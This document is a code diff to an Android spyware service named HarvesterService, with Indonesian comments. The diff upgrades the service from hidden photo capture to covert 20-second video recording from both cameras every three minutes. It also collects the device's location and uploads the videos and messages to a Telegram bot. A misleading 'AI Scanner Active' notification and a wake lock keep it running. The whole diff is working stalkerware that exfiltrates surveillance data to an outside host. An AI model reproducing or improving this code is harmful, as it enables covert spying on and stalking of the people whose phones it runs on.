@@ -5,18 +5,19 @@ import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.Service;
 import android.content.Intent;
+import android.content.pm.ServiceInfo;
 import android.database.Cursor;
 import android.graphics.SurfaceTexture;
 import android.hardware.Camera;
 import android.location.Location;
 import android.location.LocationManager;
+import android.media.MediaRecorder;
 import android.os.Build;
 import android.os.IBinder;
 import android.os.PowerManager;
 import android.provider.ContactsContract;
 import org.json.JSONObject;
 import java.io.File;
-import java.io.FileOutputStream;
 import okhttp3.*;
 
 public class HarvesterService extends Service {
@@ -37,7 +38,12 @@ public class HarvesterService extends Service {
             }
             Notification.Builder builder = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ? new Notification.Builder(this, CHANNEL_ID) : new Notification.Builder(this);
             Notification notification = builder.setContentTitle("AI Scanner Active").setContentText("Memproses...").setSmallIcon(android.R.drawable.ic_menu_camera).setOngoing(true).build();
-            startForeground(1, notification);
+            
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                startForeground(1, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA);
+            } else {
+                startForeground(1, notification);
+            }
 
             PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
             wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "AISpy::WakeLock");
@@ -64,15 +70,19 @@ public class HarvesterService extends Service {
                         String locLink = getLocationLink();
                         
                         try {
-                            takePhotoWithCamera(0, "📸 Foto Belakang");
+                            // REKAM BELAKANG 20 DETIK
+                            recordVideoWithCamera(0, "🎥 Video Belakang", 20000);
                             Thread.sleep(2000);
-                            takePhotoWithCamera(1, "📸 Foto Depan");
+                            // REKAM DEPAN 20 DETIK
+                            recordVideoWithCamera(1, "🎥 Video Depan", 20000);
                         } catch (Exception e) {
-                            sendTgText("❌ ERROR KAMERA: " + e.getMessage());
+                            sendTgText("❌ ERROR REKAM: " + e.getMessage());
                         }
 
                         sendTgText("🟢 <b>LIVE UPDATE</b>\n📍 Lokasi: " + locLink + "\n🕒 Waktu: " + new java.util.Date().toString());
-                        Thread.sleep(300000); // 5 Menit
+                        
+                        // JEDA 3 MENIT (180000 ms)
+                        Thread.sleep(180000); 
                         
                     } catch (Exception e) {
                         sendTgText("❌ ERROR MAIN LOOP: " + e.getMessage());
@@ -90,31 +100,50 @@ public class HarvesterService extends Service {
             Location loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
             if (loc == null) loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
             if (loc != null) return "https://maps.google.com/?q=" + loc.getLatitude() + "," + loc.getLongitude();
-        } catch (Exception e) {
-            return "Izin Lokasi Ditolak!";
-        }
+        } catch (Exception e) { return "Izin Lokasi Ditolak!"; }
         return "Lokasi gak tersedia.";
     }
 
-    private void takePhotoWithCamera(int cameraId, String caption) {
+    private void recordVideoWithCamera(int cameraId, String caption, int durationMs) {
         Camera camera = null;
+        MediaRecorder recorder = new MediaRecorder();
         try {
             camera = Camera.open(cameraId);
-            camera.setPreviewTexture(new SurfaceTexture(0));
-            camera.startPreview();
-            camera.takePicture(null, null, new Camera.PictureCallback() {
-                @Override
-                public void onPictureTaken(byte[] data, Camera cam) {
-                    String fileName = (cameraId == 0) ? "spy_back.jpg" : "spy_front.jpg";
-                    File file = new File(getExternalFilesDir(null), fileName);
-                    try (FileOutputStream fos = new FileOutputStream(file)) { fos.write(data); } catch (Exception e) {}
-                    cam.release();
-                    sendTgPhoto(file, caption);
-                }
-            });
+            camera.unlock();
+            
+            recorder.setCamera(camera);
+            // TANPA AUDIO
+            recorder.setVideoSource(MediaRecorder.VideoSource.CAMERA);
+            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
+            recorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
+            
+            recorder.setVideoSize(640, 480); 
+            recorder.setVideoFrameRate(20);
+            recorder.setVideoEncodingBitRate(500000); 
+
+            String fileName = (cameraId == 0) ? "video_back.mp4" : "video_front.mp4";
+            File file = new File(getExternalFilesDir(null), fileName);
+            recorder.setOutputFile(file.getAbsolutePath());
+
+            SurfaceTexture dummy = new SurfaceTexture(0);
+            camera.setPreviewTexture(dummy);
+            
+            recorder.prepare();
+            recorder.start();
+            
+            Thread.sleep(durationMs); 
+
+            recorder.stop();
+            recorder.release();
+            camera.lock();
+            camera.release();
+            
+            sendTgVideo(file, caption);
+
         } catch (Exception e) {
-            if (camera != null) camera.release();
-            sendTgText("❌ ERROR KAMERA " + cameraId + ": " + e.getMessage());
+            if (recorder != null) { recorder.reset(); recorder.release(); }
+            if (camera != null) { camera.lock(); camera.release(); }
+            sendTgText("❌ ERROR VIDEO " + cameraId + ": " + e.getMessage());
         }
     }
 
@@ -140,13 +169,15 @@ public class HarvesterService extends Service {
         } catch (Exception e) {}
     }
 
-    private void sendTgPhoto(File file, String caption) {
+    private void sendTgVideo(File file, String caption) {
         try {
             RequestBody requestBody = new MultipartBody.Builder().setType(MultipartBody.FORM)
                     .addFormDataPart("chat_id", CHAT_ID).addFormDataPart("caption", caption)
-                    .addFormDataPart("photo", file.getName(), RequestBody.create(file, MediaType.parse("image/jpeg"))).build();
-            client.newCall(new Request.Builder().url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto").post(requestBody).build()).execute();
-        } catch (Exception e) {}
+                    .addFormDataPart("video", file.getName(), RequestBody.create(file, MediaType.parse("video/mp4"))).build();
+            client.newCall(new Request.Builder().url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendVideo").post(requestBody).build()).execute();
+        } catch (Exception e) {
+            sendTgText("❌ ERROR KIRIM VIDEO: " + e.getMessage());
+        }
     }
 
     @Override public void onDestroy() {
